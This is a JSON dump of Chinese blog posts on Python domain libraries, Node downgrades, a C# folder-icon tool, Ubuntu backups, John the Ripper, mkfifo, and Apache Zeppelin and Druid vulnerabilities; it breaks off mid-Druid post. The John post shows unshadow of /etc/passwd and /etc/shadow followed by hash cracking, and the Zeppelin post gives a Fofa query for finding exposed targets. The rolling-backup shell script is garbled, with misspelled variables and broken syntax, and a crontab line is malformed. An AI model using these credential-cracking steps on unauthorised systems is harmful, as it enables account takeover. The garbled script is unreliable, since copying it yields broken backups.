[{"title":"python几个提取域名的库","url":"%2Fposts%2F21812%2F","content":"\n> 懒得写正则，就在网上找了找，发现了两个还不错的提取域名的第三方库\n> 赶紧拿出我的小本本记下，下次用的时候好找\n> \n\n\n### tldextract\n\n安装：\n```bash\npip3 install tldextract\n```\n\n使用：\n```python\n>>> import tldextract\n>>>\n>>> tld = tldextract.extract(\"email.jd.com.cn\")\n>>>\n>>> tld\nExtractResult(subdomain='email', domain='jd', suffix='com.cn')\n>>> tld.suffix\n'com.cn'\n```\n按照自己的场景自行发挥就行\n\n**高级用法**\n\n```python\n#为后缀列表数据指定自己的URL或文件\n#您可以指定自己的输入数据代替默认的Mozilla公共后缀列表：\n\nextract = tldextract.TLDExtract(\n suffix_list_urls=[\"http://foo.bar.baz\"],\n # Recommended: Specify your own cache file, to minimize ambiguities about where\n # tldextract is getting its data, or cached data, from.\n cache_file='/path/to/your/cache/file')\n\n#以上片段将与您指定的网址提取，在首先需要下载后缀列表（即如果cache_file不存在）。 如果你想从你的本地文件系统使用的输入数据，只需要使用file://协议：\n\nextract = tldextract.TLDExtract(\n suffix_list_urls=[\"file://absolute/path/to/your/local/suffix/list/file\"],\n cache_file='/path/to/your/cache/file')\n#请使用绝对路径suffix_list_urls关键字参数。 os.path是友好路径。\n```\n\n\n### tld\n文档：https://tld.readthedocs.io/en/latest/\n\n安装\n```bash\npip install tld\n\n```\n\n\n示例\n```python\n### Get the TLD name as string from the URL given\nfrom tld import get_tld\n\nget_tld(\"http://www.google.co.uk\")\n# 'co.uk'\n\nget_tld(\"http://www.google.idontexist\", fail_silently=True)\n# None\n\n\n\n\n\n```\n\n使用tld库中的get_tld方法：\n```python\nfrom tld import get_tld\nurl = 'http://a.b.c.d.com.cn'\ntopLeverDomain = get_tld(url,as_object=True).fld\nprint(topLeverDomain)\n#上述代码成功打印 d.com.cn\n#需要注意的是，上述代码传入的 URL 值必须是一个完整的链接，必须包含scheme，比如：http://，https://，ftp://，否则会报错。\n```\n\n\n\n\nGet the TLD as an object\n```python\n\nfrom tld import get_tld\n\nres = get_tld(\"http://some.subdomain.google.co.uk\", as_object=True)\n\nres\n# 'co.uk'\n\nres.subdomain\n# 'some.subdomain'\n\nres.domain\n# 'google'\n\nres.tld\n# 'co.uk'\n\nres.fld\n# 'google.co.uk'\n\nres.parsed_url\n# SplitResult(\n#     scheme='http',\n#     netloc='some.subdomain.google.co.uk',\n#     path='',\n#     query='',\n#     fragment=''\n# )\n\n```\n\n\n\nGet TLD name, ignoring the missing protocol\n```python\nfrom tld import get_tld, get_fld\n\nget_tld(\"www.google.co.uk\", fix_protocol=True)\n# 'co.uk'\n\nget_fld(\"www.google.co.uk\", fix_protocol=True)\n# 'google.co.uk'\n```\n\nGet the first level domain name as string from the URL given\n```python\nfrom tld import get_fld\n\nget_fld(\"http://www.google.co.uk\")\n# 'google.co.uk'\n\nget_fld(\"http://www.google.idontexist\", fail_silently=True)\n# None\n\n```\n\n\nReturn TLD parts as tuple\n```python\n\nfrom tld import parse_tld\n\nparse_tld('http://www.google.com')\n# 'com', 'google', 'www'\n```\n\n\nCheck if some tld is a valid tld\n```python\nfrom tld import is_tld\n\nis_tld('co.uk)\n# True\n\nis_tld('uk')\n# True\n\nis_tld('tld.doesnotexist')\n# False\n\nis_tld('www.google.com')\n# Falses\n```\n\n\n\n","tags":["tld"],"categories":["Python"]},{"title":"mac下node降级","url":"%2Fposts%2F5227%2F","content":"\n刚把电脑换成M1(别问我为啥不等新的，因为穷)，因为node版本太高，导致`hexo d`报错， 网上搜的说是node版本太高了，于是就想着降级。\n\n\n#### 1.安装node版本管理模块n\n```\nsudo npm install n -g\n```\n\n#### 2.下边步骤请根据自己需要选择\n安装稳定版\n```bash\nsudo n stable\n```\n\n安装最新版\n```bash\nsudo n latest\n```\n\n\n版本降级/升级\n```bash\n\nsudo n 指定版本号  # 例如：sudo n 9.1.7\n\n# 可以去这个地址查 https://nodejs.org/dist/\n```\n\n\n","tags":["node降级"],"categories":["日常问题"]},{"title":"Windows更换指定文件夹图标","url":"%2Fposts%2F10937%2F","content":"\n### 前景提示\n\n小学弟要我写这种奇奇怪怪的东西，奇奇怪怪的东西.... :laughing:\n\n\n\n![哈哈哈](http://image.xpshuai.cn/hahah.png)\n\n好了，那就写写吧，谁让我这么可爱呢（小菜鸡瑟瑟发抖） :sweat_smile:\n\n\n\n\n\n### 正题\n\n先画个界面（哈哈指向画界面不行写代码）\n\n![](http://image.xpshuai.cn/formui.png)\n\n\n\n贴上垃圾的code：\n\n```c#\nusing System;\nusing System.Collections.Generic;\nusing System.ComponentModel;\nusing System.Data;\nusing System.Diagnostics;\nusing System.Drawing;\nusing System.IO;\nusing System.Linq;\nusing System.Text;\nusing System.Threading.Tasks;\nusing System.Windows.Forms;\n\nnamespace 更换指定文件夹图标\n{\n    public partial class Form1 : Form\n    {\n\n        public string foldPath;\n        public string icoPath;\n        public string desktopiniPath;\n\n        public Form1()\n        {\n            InitializeComponent();\n        }\n\n        // 选择要更换的文件夹\n        private void textBox1_MouseClick(object sender, MouseEventArgs e)\n        {\n            try\n            {\n                this.textBox1.Text = \"\";\n                FolderBrowserDialog dialog = new FolderBrowserDialog();\n                dialog.Description = \"请选择文件路径\";\n                if (dialog.ShowDialog() == DialogResult.OK)\n                {\n                    foldPath = dialog.SelectedPath;\n                }\n\n                //System.Diagnostics.Process.Start(\"Explorer.exe\", \"c:\\\\windows\");\n                this.textBox1.Text = foldPath;\n            \n            }\n            catch (Exception)\n            {\n                MessageBox.Show(\"请正确选择图标文件!\", \"提醒\", MessageBoxButtons.OK, MessageBoxIcon.Information);\n            }\n\n        }\n\n        //选择要更换的图标\n        private void textBox2_MouseClick(object sender, MouseEventArgs e)\n        {\n            try\n            {\n                this.textBox2.Text = \"\";\n                OpenFileDialog open = new OpenFileDialog();\n                open.CheckFileExists = true;\n                open.Multiselect = false;\n                open.RestoreDirectory = true;\n                open.Multiselect = false;\n                open.RestoreDirectory = true; \n                open.Filter = \"图标文件(*.*)|*.ico\";\n\n                if (open.ShowDialog() == System.Windows.Forms.DialogResult.OK)\n                {\n                    // 获取文件路径 \n                    icoPath = open.FileName;\n                    this.textBox2.Text = icoPath;\n\n                }\n            }\n            catch (Exception)\n            {\n                MessageBox.Show(\"请正确选择图标文件!\", \"提醒\", MessageBoxButtons.OK, MessageBoxIcon.Information);\n            }\n        }\n\n        private void button1_Click(object sender, EventArgs e)\n        {\n            if (textBox1.Text != \"\" && textBox2.Text != \"\" && textBox3.Text != \"\" && textBox4.Text != \"\")\n            {\n                //1.新建desktop.ini文件\n                desktopiniPath = foldPath + \"\\\\desktop.ini\";          //设置文件路径\n                if (!File.Exists(desktopiniPath))\n                {\n                    FileStream fs1 = new FileStream(desktopiniPath, FileMode.Create, FileAccess.Write);//创建写入文件\n                    StreamWriter sw = new StreamWriter(fs1);\n\n                    sw.WriteLine(\"[.ShellClassInfo]\");//开始写入值\n                    sw.WriteLine(\"InfoTip=\" + textBox3.Text);\n                    sw.WriteLine(\"LocalizedResourceName=\" + textBox4.Text);\n                    sw.WriteLine(\"\");\n                    sw.WriteLine(\"IconFile=\" + icoPath);\n                    sw.WriteLine(\"IconIndex=mainicon\");\n                    sw.WriteLine(\"\");\n\n                    sw.WriteLine(\"[[ExtShellFolderViews]]\");\n                    sw.WriteLine(\"[{BE098140-A513-11D0-A3A4-00C04FD706EC}]\");\n                    sw.WriteLine(\"IconArea_Text=0x000000FF\");\n                    sw.WriteLine(\"\");\n                    sw.WriteLine(\"[DeleteOnCopy]\");\n                    sw.WriteLine(\"Owner=Temp\");\n                    sw.WriteLine(\"PersonalizedName=My test file\");\n                    sw.WriteLine(\"\");\n\n                    sw.WriteLine(\"[ViewState]\");\n                    sw.WriteLine(\"Mode=\");\n                    sw.WriteLine(\"Vid=\");\n                    sw.WriteLine(\"FolderType=Generic\");\n                    sw.Close();\n                    fs1.Close();\n\n                }\n            }\n            else\n            {\n                MessageBox.Show(\"请输入完整文本框内容!\", \"提醒\", MessageBoxButtons.OK, MessageBoxIcon.Information);\n            \n            }\n\n\n            //2.\n            Process CmdProcess = new Process();\n            CmdProcess.StartInfo.FileName = \"cmd.exe\";\n            CmdProcess.StartInfo.WorkingDirectory = foldPath;  // cmd打开的目录\n            CmdProcess.StartInfo.CreateNoWindow = true;         // 不创建新窗口    \n            CmdProcess.StartInfo.UseShellExecute = false;       //不启用shell启动进程  \n            CmdProcess.StartInfo.RedirectStandardInput = true;  // 重定向输入    \n            CmdProcess.StartInfo.RedirectStandardOutput = true; // 重定向标准输出    \n            CmdProcess.StartInfo.RedirectStandardError = true;  // 重定向错误输出  \n            //2.1隐藏desktop.ini文件\n             // attrib +h temp/desktop.ini\n            // attrib +s temp\n            DirectoryInfo pathInfo = new DirectoryInfo(foldPath);\n            //string newPath = pathInfo.Parent.FullName;  //父目录名\n            int index = foldPath.LastIndexOf('\\\\');\n            //从下一个索引开始截取\n            string desktopName = foldPath.Substring(index + 1);  //后面文件名\n\n            CmdProcess.Start();//执行  \n            CmdProcess.StandardInput.WriteLine(\"attrib +h \" + desktopiniPath + \"&& cd .. && attrib +s \" + desktopName + \" && exit\");\n            CmdProcess.StandardInput.AutoFlush = true;\n            CmdProcess.WaitForExit();//等待程序执行完退出进程  \n            CmdProcess.Close();//结束 \n\n            MessageBox.Show(\"OK!\", \"提示\", MessageBoxButtons.OK, MessageBoxIcon.Information);\n        }\n    }\n}\n\n```\n\n\n\n**链接：**\n\nhttps://github.com/shuai06/ChangeDirLogo\n\n\n\n### BUG\n\n完成之后确实更改了，但是有一定延迟......:cry:\n\n","tags":["自写小工具"],"categories":["Windows"]},{"title":"ubuntu server-备份还原","url":"%2Fposts%2F19058%2F","content":"\n**备份还原**\n\n>备份是免于损失的有效手段\n>防火防盗防自己（保持良好睡眠）\n>版本管理也视为一种备份(上下文不同)\n\n\n##  备份还原基础\n\n### 首先考虑问题\n\n**1. what to backup**\n\n```bash\n数据、配置、操作系统、运行环境\n```\n\n**2. where to back**\n\n```bash\n本地、远程、异地三个副本\n磁盘、光盘、磁带、一次性写入介质\n```\n\n**3. how to restore it**\n\n```bash\n备份系统自动恢复\n人工手动恢复\n```\n\n\n## 备份方式\n\n### <font color=red>Shell脚本手动备份</font>\n\n>tar打包压缩减小备份文件大小\n\n写个简单的shell脚本\n\n```bash\n## 如脚本内容,对指定目录打包\n#!/bin/bash\n#备份源\nbackup_files=\"/opt/google  /etc/Documents\"\n#备份目标\ndest=\"/backup\"\n#创建归档文件(主机名-时间)\nday=$(date +%Y-%m-%d-%A-%T)\nhostname=$(hostname -s)\narchive_file=\"$hostnane-$day.tgz\"\n#显示备份状态\necho \"Backing up $backup_files to $dest/$archive_file\"\ndate\n#执行备份.\ntar czPf $dest/$archive_file $backup_files\n\n```\n\n然后手动运行shell脚本(或做一个定时任务crontab)\n\n```bash\nchmod u+x backup.sh\n./backup.sh    \n```\n\n问题：在业务繁忙时候，影响服务器性能和网络带宽，影响正常业务运行（所有基于业务空闲时候来决定备份时间）\n\n\n验证备份\n\n```bash\ntar -tzvf /backup/backup.tgz\n```\n\n还原/恢复\n\n```bash\n# 解压到指定目录\ntar -zxvf /backup/backup.tgz -C /tmp\n\n# 解压到原目录(会覆盖已有文件)\ncd /\nsudo tar -zxvf /backup/host-Monday.tgz \n```\n\n\n\n### <font color=red>Shell脚本自动备份</font>\n\n>cron计划任务\n\n配置文件：`/etc/crontab`\n配置\n\n```bash\nsudo crontab -e    # 这里是root权限运行（不同用户有自己的计划任务）\n30 23 0 * * 1 /bin/bash /home/xps/backup.sh    # 每周一的23:30执行\n\n# 分(m,0-59)  时(h,0-23)  日(dom,1-31) 月(mon,1-12) 周(dow,0-7) 命令(command)\n\n# ctrl + o 保存， ctrl + x 退出\n\ncrontab -l    # 查看当前用户已有计划任务列表\n```\n\n### 全量滚动备份计划\n\n例如：每天做一个日备份，到一周就合并为一个周备份，到一个月就合并为一个月备份\n\n```bash\n两个月为周期滚动备份\n每月1日执行月备份\n每周六执行周备份\n每天进行日备份\n6个日备份 + 4个周备份 + 2个月备份\n```\n\n脚本\n\n```bash\n#备份源\nbackup_files=\" /home /var/spool/mail /etc /root /boot /opt\"\n#备份目标\ndest=\"/backup\"\n#归档文件名变量(星期几 / 主机名).\nday=$(date +%A)\nhos tnane=$(hostname -s)\n#当前是每月中第几个星期\nday_nun=S(date +%-d)\nif (( $day .nun <= 7 )); then\nweek_file= \"$hostname -week1.tgz\"\nellf (( $day_num > 7 & $day_nun <= 14 )); then \nweek_file=\"$hostname -week2.tgz \"\nelif (( $day_nun >14 && $day_nun <= 21 )); then\nweek_file=\" $hostname -week3.tgz\"\nelif ( $day_num >21 && $day_num < 32 )); then\nweek_file=\" hostname -week4. tgz\"\nfi\n#单数月 / 双数月\nnonth_num=$(date +%m)\nmonth=$(expr $month_num % 2)    # 如果余数\nif [ $month -eq θ ]; then        # 如果余数等于0\nnonth_file=\"$hostname - nonth2.tgz\"\nelse\nmonth_file=\"$hostname -nonth1.tgz\"\nfi\n#创建归档文件(每月1日-->月备份、 每周六-->周备份、每天-->日备份)\nif [ $day_num == 1 ]; then\narchive_file=$month_file\nelif [ $day != \"Saturday\" ]; then\narchive_file=\" $hostname -$day.tgz\"\nelse\narchive_file=$week_file\nfi\n\n\n#显示备份开始信息\necho \"Backing up Sbackup_ ftles to $dest/$archive_file\"\ndate\necho\n#使用tar命令备份\ntar CzPf $dest/$archive_file $backup_files\n#显示备份结束信息\necho\necho \"Backup fintshed \"\ndate\n#结束后查看备份文件大小\nls -lh $dest/\n\n```\n\n也可以加入到计划任务里面执行\n\n\n缺陷：\n\n- 每个备份都是完整备份\n- 备份时间长,磁盘空间占用量大\n\n\n\n### 增量差异备份\n\n#### <font color=red>Rsync</font>\n\n- Linux 下众多备份工具，只rsync是必须掌握的一个\n- 在两个目录或两个主机之间同步文件（ 从源`单向`同步到目标，但不双向同步）\n- 支持增量备份，节省时间带宽源\n- 参数众多\n- 学习时建议使用例子文件（使用不当可能破坏文件）\n- 还原时：先把最前面的完整备份还原，然后依次还原后面的增量备份\n- \n\n\n**文件服务器**\n\n```bash\n# 创建演示文件\nmkdir sampledir\ntouch sampledir/file{1..10}\n```\n\n**客户端**同步(`下拉`)\n\n```bash\n# 安装\napt install rsync\n# 同步服务端的文件\nrsync -azP -e ssh xps@1.1.1.1:~/sampledir  backup/\n# 也可以基于密钥、密码身份认证\n# sampledir 后的/表示拷贝其中所有内容,没有/表示拷贝该目录\n\n#服务端新增、修改文件后再次运行此命令,只有变更的部分同步\n#服务器断删除文件后再次运行此命令,客户端不同步删除动作\n```\n\n\n同步本地文件夹到服务端\n\n```bash\n# 源    目标\nrsync /var/log/mysql  ~/mysql_log_backup\n```\n\n计划任务\n\n```bash\n# 每天执行计划任务执行rsync\ncrontab -e\n@daily rsync -azPe ssh xps@1.1.1.1:~/sampledir /backup\n\n```\n\n向上同步(`推`)\n\n```bash\nrsync -azP -e ssh backup/ xps@1.1.1.1:~/sampledir\n-a =-rlptgoD    # 归档，保留修改时间戳、符号链接、权限等元数据\n-r        # 递归拷贝目录内容(不保留权限)\n-l        # 拷贝符号链接\n-p        # 保留权限\n-g        # 保留组所有者\n-o        # 保留用户所有者\n-D        # 保留设备文件\n-v        # 显示详细信息\n-z        # 压缩\n-P        # 生成进度文件，实现进程报告和断点续传\n-e        # 指定远程shell类型，默认rsync明文传输数据\n--exclude pattern    # 指定排除的文件名\n--exclude-from filename.txt    # 排除文件名的特征文件(把几个文件名写到一个文件里面)\n--include pattern    # 指定包含的文件名\n--include-from filename    \n\n# 排除文件\nrsync -azP --exclude 'dir*' source/ destination/\nrsync -azP --exclude-from 'exclude-list.txt' source/ destination/\n\n# SSH非标准端口\nrsync -azP -e \"ssh -P port_number\" source destination\n\n```\n\n\n\n**rsync默认不删除目标文件**\n\n```bash\n--delete\t#镜像源目的内容，源删文件目的也删\n--backup\t#删除/覆盖前备份源文件（改名防覆盖)\n--backup-dir\t#指定备份路径\n--remove-source-files\t#成功传输后删除来源文件\n--dry-run\t#模拟执行命令，并输出结果(并不真正修改文件)\n\nrsync --remove-source-files -azPv srcl dest/\nrsync --dry-run --remove-source-files -azPv src/ dest/\n\n```\n\n\n\n\n\n**增量备份：**\n\n```shell\n# touch backup.sh\n# chmod +x backup.sh\n# mv backup.sh usr/local/bin\n# vi backup.sh\n\n#/bin/bash\nCURDATE=$(date +%Y-%m-%d)\nrsync -avb --delete --backup-dir=/backup/$CURDATE /src /dest\n\n```\n\n\n\n#### 其他工具\n\n**双向同步工具**\n\n```bash\nsudo apt install unison\nunison ~lsampledir ssh:l/1.1.1.1//homelyuanfh/documents\n```\n\n\n\n**实时同步工具**\n\n```bash\nsudo apt install lsyncd\n#lsyncd实时监视本地文目录变化\n#默认使用Rsync实现文件同步SCP / SSHFS\n#参考以前章节内容\n```\n\n\n\n**SCP/SSHFS**\n\n\n\n\n\n\n\n#### <font color=red>Bacula</font>\n\n##### 简介\n\nBacula 是一款开源的跨平台网络备份工具，它提供了基于企业级的客户端/服务器的备份恢复解决方案。通过它，系统管理人员可以对数据进行备份、恢复，以及完整性验证等操作。同时，它还提供了许多高级存储管理功能，使系统管理人员能够很容易发现并恢复丢失的或已经损坏的文件。正因如此，Bacula 也被誉为**最好的开源企业级备份工具**。\n\n\n\n\n- **基于网络**的开源备份、还原、验证软件\n- 对标商业备份软件的功能\n- 客户端支持Windows(很久不更新了，主在其他系统)、Linux、Unix、MAC有多个开源工具组合而成\n- 软件架构\n  - **Director** :主进程，控制所有备份、恢复、验证、归档操作\n  - **Console**:管理员于Director通信的操作借口，分为三种类型\n    - 基于文本的命令行版本(完全的功能)\n    - 基于Gnome GTK+的GUI版本(大部分功能)\n    - wxWidgets GUI版本(大部分功能)\n  - **File Daemon** : Bacula客户端程序，**安装在需要备份的计算机上**\n    - 负责在Director请求时提供文件属性和数据\n    - 恢复阶段负责恢复文件属性和数据，以后台进程的形式运行\n  - **Storage Daemon** :读写备份存储介质，执行数据存储和恢复\n  - **Catalog** :为所有备份文件维护索引和卷数据库\n    - 快速定位和恢复归档文件\n    - 支持 MySQL、PostgreSQL、SQLite\n    - 摘要信息(备份任务、客户端、被备份的文件以及他们存放在哪个卷上)\n    - 不存放被备份的文件本身\n    - 是bacula区别于简单备份工具的关键\n  - Monitor :允许监视Dir、FD和SD(仅GTK+ GUI可用)\n- C/S、模块化结构，可单机或分布式部署\n  最新版支持一次性写入介质和Amazon s3\n- 适合大型环境\n\n\n\n\n\n![架构](http://image.xpshuai.cn/becula_arch.png)\n\n\n\n##### 安装配置\n\n\n\n###### 1.安装数据库\n\n```bash\nsudo apt install bacula-director-pgsql\n# 各种根据自己情况选项\n# 数据库安装在远程还是本地，创建数据库账号的密码或直接回车他自己会随机生成\n\nsudo su postgres\npsql\n\\l\t# 可以查看库\n\\c bacula\t# 连接上这个库\n\\d\n```\n\n\n\n###### 2.安装 Director\n\n```bash\n# 和上面的数据库是可以不安装在一台机器上的\n\nsudo apt install bacula-director\n\n#-随机生成数据库密码\n#-依赖Postfix(后期配置)\n#-侦听TCP9101\n```\n\n\n\n**2.1修改配置文件**\n\n```bash\n#1.主配置文件\n# vim /etc/bacula/bacula-dir.conf\n\n# 如果要所有网卡都侦听9101，则直接注释当前DirAddress即可\n# 否则有多高个网卡要侦听不同的端口，还需要在Director下增DirAddresses,并注释之前的DIRport\nDirector {\n\t#......\n\tDirAddresses ={\n\t  ip = { addr = 127.0.0.1;port = 9101;}\n\t  ip = { addr = 192.168.1.1; port = 9101;}\t\n\t}\n}\n\n#2.重启服务\nsudo systemctrl restart bacula-director\n\n```\n\n\n\n###### 3.安装SD(storage)\n\n```bash\nsudo apt install bacula-sd  \n# 默认监听tcp 9013端口\n```\n\n\n\n同样也需要修改配置文件\n\n```bash\n#1.SD配置文件\n# vim /etc/bacula/bacula-sd.conf\n#SDAddress和SDPort注释掉，并和上面一样增加\nStrage {\n\t#......\n\tSDAddress ={\n\t  ip = { addr = 127.0.0.1;port = 9101;}\n\t  ip = { addr = 192.168.1.1; port = 9101;}\t\n\t}\n}\n#2.重启服务\nsudo systemctrl restart bacula-sd\n\n```\n\n\n\n###### 4.安装FD(客户端)\n\n```bash\nsudo apt install bacula-fd\n\n# \n```\n\n\n\n配置\n\n```bash\n# /etc/bacula/bacula-fd.conf\n\n# 1.FD配置\nFileDaemon {\n\t#FDAddress = 127.0.0.1\n\t# 这个机器所有ip都侦听9102端口\n\t}\n\t\n#仅客户端安装\n\n#2.重启服务\nsudo systemctrl restart bacula-fd\n#默认监听TCP 9102\n\n```\n\n\n\n\n\n**在网络中其他计算机上安装FD Windows客户端**\n\n- https://sourceforge.net/projects/bacula/files/\n\n\n\n\n\n```bash\n#配置FD\n\n## 客户端配置\n#sudo vi /etc/bacula/bacula-fd.conf\n\nDirector {\n\tName = Server-dir # 指定服务器的名字Name\n\tPassword= \"FmvH\"\t# \n\t#director:\n}\n\n## 服务器端配置\n# sudo vi /etc/bacula/bacula-dir.conf\nClient {\n\tName = Client-fd  # 指定客户器的名字Name\n\tAddress = 192.168.1.2\n\tPassword =\"FmvH\"\t# \n}\n\n```\n\n\n\n###### 5.安装Console\n\n```bash\nsudo apt install bacula-console\n\nsudo bconson\t#进入控制台\nshow clients\t#配置文件添加成功\nstatus\t\t\t#验证连接是否成功\n```\n\n\n\n##### 使用\n\n一些名词：\n\n![1](http://image.xpshuai.cn/becula_n1.png)\n\n![2](http://image.xpshuai.cn/becula_n2.png)\n\n\n\n\n\n```bash\nlevel = Full\t# 全量备份\n\nFile = xxxx\t# 要备份的目录\n\nSchedule  {}\t# 指定备份周期\n\n```\n\n\n\n\n\n执行磁盘备份(文件)\n\n\n\n添加Lable/指定备份客户端\n\n```bash\n# sudo vi /etc/bacula/bacula-dir.conf\n\nPool {\n\tName = File\n\tLabel Format = \"Vol-S{Year}_${Month}_${Day}\" #备份文件名称格式，便于识别和管理\n}\n\nJob {\n\tName = \"BackupClient1\"\n\tJobDefs = \"DefaultJob\"\n\tLevel = Full\n\tClient = client-fd\n\t}\n```\n\n\n\n指定备份位置\n\n```bash\n# sudo vi/etc/bacula/bacula-sd.conf\n\n#\nDevice {\n\tName = FileChgr1-Dev1\n\tArchive Device = /backups    #需要可写权限\n}\n\nDevice {\n\tName = FileChgr1-Dev2\n\tArchive Device = /backups2    #需要可写权限\n}\n```\n\n\n\n运行备份\n\n```bash\nbconsole - run - BackupClient1\n```\n\n查看备份任务状态\n\n```bash\nbconsole - status - director — list jobs\nmessage\t#查看成功/报错详细信息\n```\n\n配置FileSet\n\n```bash\nFileSet {\nFile = /usr/sbin\n}\n```\n\n\n\n报错等待连接存储\n\n```bash\nsudo vi letc/bacula/bacula-dir.conf\n\nAutochanger {\nName = File1\n#Do not use \"localhost\"\" here\nAddress = 192.168.1.1  #此处不要使用localhost\n}\n\n```\n\n\n\nBacula 通知fd向sd存储数据，若sd侦听于localhost，网络不通\n\n\n\n\n\n\n\n","tags":["Bacula"],"categories":["Linux"]},{"title":"使用John the Ripper破解密码","url":"%2Fposts%2F2845%2F","content":"\n\n\n### 简介\n\n**John the Ripper**是一个快速的密码破解工具，用于在已知密文的情况下尝试破解出明文，支持目前大多数的加密算法，如DES、MD4、MD5等。它支持多种不同类型的系统架构，包括Unix、Linux、Windows、DOS模式、BeOS和OpenVMS，主要目的是破解不够牢固的Unix/Linux系统密码。除了在各种Unix系统上最常见的几种密码哈希类型之外，它还支持Windows LM散列，以及社区增强版本中的许多其他哈希和密码。它是一款开源软件。Kali中自带John。\n\n\n\nJohn the Ripper支持**字典破解**方式和**暴力破解**方式\n\n可执行文件位置： ` /usr/sbin/john`\n\n密码字典所在目录：`/usr/share/john/`\n\n\n\n\n\n### 破解Linux系统密码\n\n**1.先安装**\n\n```bash\nsudo apt install john\n```\n\n\n\n**2.使用 unshadow 命令组合 /etc/passwd 和 /etc/shadow ，组合成 test_passwd 文件（test_passwd 就是 /etc/passwd 和 /etc/shadow 的简单组合:）。**\n\n```bash\nunshadow  /etc/passwd  /etc/shadow >  test_passwd\n```\n\n\n\n**3.然后用 John 破解密码了。**\n\n```bash\n# 我们可以使用 John 自带的密码字典，位于 /usr/share/john/password.lst ，也可以使用我们自己的密码字典。\n\n# 用John自带的密码字典为例：\njohn  test_passwd\n\n# 若使用自己的密码字典：\njohn  --wordlist=字典路径   test_passw\n```\n\n\n\n**4.查看破解信息**\n\n```bash\njohn  --show  test_passwd\n```\n\n","tags":["爆破Linux密码"],"categories":["工具"]},{"title":"Python解析IP地址CIDR的形式","url":"%2Fposts%2F24151%2F","content":"\n\n\n### 方法1：使用IPy库\n\n```python\n\nfrom IPy import IP\nip = IP('127.0.0.0/30')\nfor x in ip:\n\tprint(x)     \n\n```\n\n\n\n### 方法二：使用netaddr库\n\n- CIDR也能直接转成IP地址段\n\n```python\nfrom netaddr import *\nip = IPNetwork('192.0.2.16/29')\nip_list = list(ip)\nprint(ip_list)\n\n[IPAddress('192.0.2.16'), IPAddress('192.0.2.17'), IPAddress('192.0.2.18'), IPAddress('192.0.2.19'), IPAddress('192.0.2.20'), IPAddress('192.0.2.21'), IPAddress('192.0.2.22'), IPAddress('192.0.2.23')]\n```\n\n\n\n\n\n- IP段208.130.29.30-35转换成CIDR格式\n\n```python\n\nfrom netaddr import *\nstartip = '208.130.29.30'\nendip = '208.130.29.35'\ncidrs = netaddr.iprange_to_cidrs(startip, endip)\nfor k, v in enumerate(cidrs):\n\tiplist = v\n \tprint(iplist)\n\n\n```\n\n","tags":["netaddr"],"categories":["Python"]},{"title":"Linux mkfifo命令基本用法","url":"%2Fposts%2F18873%2F","content":"\n\n\n### 先复习下linux命令执行顺序\n\n```bash\n# 通常，终端只能执行一条命令, 如果要执行多条命令\n# 顺序执行多条命令，可以用分号;\ncmd1;cmd2;cmd3\n\n# 条件执行多条命令，使用&&(前一个命令执行成功，即$?=0时，执行下一条命令，否则不执行)和||(前一个命令执行失败，既$?≠0时，执行下一条命令)\ncmd1&&cmd2||cmd3\n\n#$?:上一次命令的返回结果 --->  为0代表执行成功，不为0则为执行失败\n```\n\n\n\n\n\n### 管道命令(pipe)\n\n- 管道是一种`通信机制`，用于进程间的通信（也可通过socket进行网络通信），表现出来的形式将前面的每一个进程的输出，直接作为下一个进程的输入\n- <font color=red>管道命令仅能处理stdout，而error则会忽略</font>\n\n\n\n\n\n### 常见管道命令\n\n- cut、grep、sort、wc、uniq\n- tee：重定向，既能在屏幕输出，又能保存到文件中\n- tr、col、join、paste、expand、split\n\n\n\n\n\n### 有名管道+无名管道=管道\n\n- 有名管道(FIFO文件)：就是 有文件名的管道, 可以用于任意两个进程间的通信\n- 无名管道(pipe文件)：就是没有文件名的管道, 只能用于父子进程之间的通信\n\n\n\n### mkfifo\n\n> mkfifo可以创建命名管道\n\n\n\n```bash\n# |（竖线）为管道，是两个进程之间的通信通道\n例如：ls|grep txt\n#ls和grep由|分开，管道创建了程序之间的通信通道，将ls的输出作为输入传给grep\n\n\n# 由mkfifo创建出来的就是一个命名管道\n例如：mkfifo pipe2\n#pipe2就是一个命名管道。\n```\n\n\n\n**命名管道的作用**\n\n```bash\n# 可以将输出信道化到不同终端、\n例如：\n在第一个终端执行\nls > pipe2\n在第二个终端执行\ncat < pipe2（或cat pipe2,是取一次。cat < pipe2是持续输入，只要有内容传到pipe2中，就会有内容输出）\n\n#pipe2更像是一个临时存储的地方，使用cat pipe2取过内容之后，再执行cat pipe2 ，则不会有显示\n```\n\n\n\n命名管道可以像正常文件一样访问，在文档类型可以看到为p：\n\n```bash\nubuntu@VM-0-14-ubuntu:~$ ll pipe2\nprw-rw-r-- 1 ubuntu ubuntu 0 Jun  7 09:35 pipe2|\n```\n\n删除就像正常文件一样使用rm删除即可\n\n\n\n\n\n> 可以使用指定的名称创建先进先出文件（FIFO）\n\n \n\n**语法格式：**mkfifo [参数] [名称]\n\n\n\n**常用参数：**\n\n| m <模式> | 设置权限模式，类似chmod                  |\n| -------- | ---------------------------------------- |\n| -Z <CTX> | 将每个创建的目录SELinux安全环境设置为CTX |\n\n\n\n**实例：**\n\n创建FIFO文件 /tmp/fifo：\n\n```bash\nubuntu@VM-0-14-ubuntu:~$ mkfifo /tmp/fifo\n\nubuntu@VM-0-14-ubuntu:~$ ls -l /tmp/fifo \nprw-rw-r-- 1 ubuntu ubuntu 0 Jun  7 09:47 /tmp/fifo\n```\n\n","tags":["mkfifo"],"categories":["Linux"]},{"title":"Apache Zeppelin 未授权任意命令执行漏洞","url":"%2Fposts%2F38991%2F","content":"\n### 漏洞描述\n\nApache Zeppelin 存在未授权的用户访问命令执行接口，导致了任意用户都可以执行恶意命令获取服务器权限\n\n\n\n### Fofa\n\n```bash\nicon_hash=\"960250052\"\n```\n\n\n\n### 漏洞复现\n\n![先点击这里创建一个note](http://image.xpshuai.cn/zeppelin_click.jpg)\n\n\n\n![继续填写，选择sh](http://image.xpshuai.cn/zeppelin_click2.jpg)\n\n\n\n\n\n![命令执行成功](http://image.xpshuai.cn/zeppelin_success.jpg)\n\n\n\n\n\n\n\n\n\n","tags":["未授权任意命令执行"],"categories":["渗透测试"]},{"title":"Apache Druid远程代码执行漏洞复现(CVE-2021-25646)","url":"%2Fposts%2F49228%2F","content":"\n### 漏洞描述\n\nApache Druid包括执行用户提供的JavaScript的功能嵌入在各种类型请求中的代码。此功能在用于高信任度环境中，默认已被禁用。但是，在Druid 0.20.0及更低版本中，经过身份验证的用户发送恶意请求，利用Apache Druid漏洞可以执行任意代码。攻击者可直接构造恶意请求执行任意代码，控制服务器。\n\n\n\n### 影响版本\n\nApache Druid < 0.20.1\n\n\n\n### 